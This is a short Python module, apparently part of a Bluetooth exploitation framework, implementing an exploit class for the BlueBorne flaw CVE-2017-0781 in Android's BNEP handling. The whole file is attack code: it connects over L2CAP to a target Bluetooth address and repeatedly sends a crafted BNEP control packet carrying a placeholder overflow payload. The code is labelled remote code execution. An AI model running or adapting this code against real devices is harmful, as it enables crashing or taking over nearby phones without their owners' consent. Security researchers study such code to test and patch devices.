from ..Exploit import Exploit
from pwn import *
from bluetooth import BluetoothSocket, L2CAP, set_l2cap_mtu


# rce
class CVE20170781(Exploit):
    manufacturers = {

    }  # todo

    rounds = 50

    def exploit(self, address, port=0xf):
        context.arch = 'arm'
        bp = CVE20170781.packet('AAAABBBB')
        s = BluetoothSocket(L2CAP)
        set_l2cap_mtu(s, 1500)
        s.connect((address, port))
        for i in range(self.rounds):
            s.send(bp)
        s.close()

    @staticmethod
    def set_bnep_header_extension_bit(bnep_header_type):
        return bnep_header_type | 128

    @staticmethod
    def bnep_control_packet(ctrl_type, ctrl_pkt):
        return p8(ctrl_type) + ctrl_pkt

    @staticmethod
    def packet(overflow):
        pkt = ''
        pkt += p8(CVE20170781.set_bnep_header_extension_bit(0x01))
        pkt += CVE20170781.bnep_control_packet(0x01, '\x00' + overflow)
        return pkt
